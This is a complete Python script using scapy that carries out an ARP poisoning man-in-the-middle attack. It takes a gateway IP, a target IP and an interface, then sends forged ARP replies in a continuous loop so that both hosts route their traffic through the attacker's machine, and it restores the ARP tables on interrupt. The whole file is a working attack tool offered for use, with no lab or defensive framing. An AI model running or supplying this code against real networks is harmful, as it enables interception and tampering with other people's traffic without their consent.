#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time

def main(gateway_ip, target_ip, interface):
    target = {
        'ip': target_ip,
        'mac': get_mac_address(target_ip, interface)
    }
    
    gateway = {
        'ip': gateway_ip,
        'mac': get_mac_address(gateway_ip, interface)
    }

    attacker_mac = scapy.get_if_hwaddr(interface)

    if not target['mac'] or not gateway['mac']:
        print("Could not retrieve target or gateway MAC addresses. Exiting.")
        return

    print("Initial state:")
    print(f"Gateway: {gateway['ip']} ({gateway['mac']})")
    print(f"Target: {target['ip']} ({target['mac']})")
    print(f"Attacker: ({attacker_mac})")
    print()

    print("Starting ARP poisoning attack...")
    try:
        last_time = 0
        while True:
            if time.time() - last_time > 5:
                last_time = time.time()
                should_print = True
            else:
                should_print = False
            poison_arp(gateway['ip'], gateway['mac'], target['ip'], attacker_mac, interface, should_print) # Target IP points to attacker on gateway ARP table
            poison_arp(target['ip'], target['mac'], gateway['ip'], attacker_mac, interface, should_print) # Gateway IP points to attacker on target ARP table
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        restore_arp(target['ip'], target['mac'], gateway['ip'], gateway['mac'], interface) # Gateway IP points to Gateway MAC on target ARP table
        restore_arp(gateway['ip'], gateway['mac'], target['ip'], target['mac'], interface) # Target IP points to Target MAC on gateway ARP table

def get_mac_address(ip, interface):
    try:
        arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst=ip) # ARP request (op=1)
        ans, _ = scapy.srp(arp_broadcast, timeout=2, verbose=0, iface=interface)
        return ans[0][1][1].hwsrc
    except IndexError:
        print(f"Could not get MAC address for {ip}.")
        return None

def poison_arp(dest_ip, dest_mac, src_ip, attacker_mac, interface, should_print):
    arp_spoof = scapy.Ether(dst=dest_mac)/scapy.ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac, hwsrc=attacker_mac) # Fake ARP response (op=2)
    scapy.sendp(arp_spoof, iface=interface, verbose=0)
    if should_print:
        print(f"Poisoning: {src_ip} -> {dest_ip} ({attacker_mac})")

def restore_arp(dest_ip, dest_mac, src_ip, src_mac, interface):
    pkt = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, hwsrc=src_mac, hwdst=dest_mac, psrc=src_ip, pdst=dest_ip) # Correct ARP response (op=2)
    scapy.sendp(pkt, iface=interface, verbose=0)
    print(f"Restoring: {src_ip} -> {dest_ip} ({dest_mac})")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog='ARP-Poisoning',
        description='Script for performing ARP poisoning attack'
    )
    parser.add_argument('-g', '--gateway', help='IPv4 address of the gateway', required=True)
    parser.add_argument('-t', '--target', help='IPv4 address of the target', required=True)
    parser.add_argument('-i', '--interface', help='Network interface to use', required=True)
    args = parser.parse_args()
        
    gateway_ip = args.gateway
    target_ip = args.target
    interface = args.interface

    main(gateway_ip, target_ip, interface)
